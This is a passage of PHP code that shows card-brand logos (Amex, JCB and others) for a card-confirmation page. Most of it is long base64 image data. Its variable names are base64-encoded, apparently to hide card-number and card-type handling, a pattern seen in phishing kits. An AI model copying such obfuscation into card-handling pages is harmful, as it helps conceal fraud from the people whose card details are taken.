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";
					echo GETIMG($VmlzYUltZ0NvZGU);
				}
				if($Q2FyZE51bWJlclNwbGl0 == 5){
					$bXN0ckltZ0NvZGU = "data:image/gif;base64,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";
					echo GETIMG($bXN0ckltZ0NvZGU);
				}
				if($Q2FyZFR5cGU == "amex"){
					$R0VUQU1FWENBUkQ = "data:image/png;base64,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";
					echo GETIMG($R0VUQU1FWENBUkQ);
				}
				if($Q2FyZFR5cGU == "jcb"){
					$amNiR2V0SW1nZm9yY29uZmltQ2FyZA = "data:image/png;base64,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